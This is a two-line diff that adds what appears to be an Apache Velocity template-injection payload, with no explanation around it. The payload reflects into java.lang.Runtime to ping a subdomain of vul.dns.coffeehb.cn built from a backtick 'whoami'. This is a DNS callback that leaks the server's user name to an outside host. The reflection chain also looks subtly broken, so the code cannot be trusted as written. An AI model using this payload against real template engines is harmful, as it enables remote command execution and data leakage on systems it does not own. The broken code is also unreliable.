@@ -1,0 +1,2 @@
+#set($e="e")
+$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime', $e.getClass().forName('java.lang.Runtime')).invoke(String.class.getClass().forName("java.lang.Runtime"),new String[]{"/bin/ping","-c","1"," `whoami`.vul.dns.coffeehb.cn"}).toString()
